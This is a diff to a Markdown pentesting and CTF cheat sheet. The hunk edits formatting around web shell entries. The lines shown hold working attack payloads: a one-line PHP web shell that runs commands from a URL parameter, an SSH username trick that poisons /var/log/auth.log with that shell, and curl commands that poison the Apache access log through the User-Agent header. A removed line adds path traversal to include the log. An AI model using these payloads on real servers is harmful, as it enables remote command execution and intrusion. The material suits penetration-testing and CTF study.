@@ -30,23 +30,23 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-`PHP Web Shell`
+ `PHP Web Shell`
 
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   ---
   
-`Web Shell (SSH Log Poisoning) -> /var/log/auth.log`
+  `Web Shell (SSH Log Poisoning)` /var/log/auth.log
 
   ```php
   ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
   ```
 
-`Web Shell (HTTP Log Poisoning) -> /var/log/apache2/access.log`
+  `Web Shell (HTTP Log Poisoning)` /var/log/apache2/access.log
 
   ```cmd
-  curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2/browse.php?file=../../../../../var/log/apache2/access.log"
+  curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
   ```
   
   ```cmd
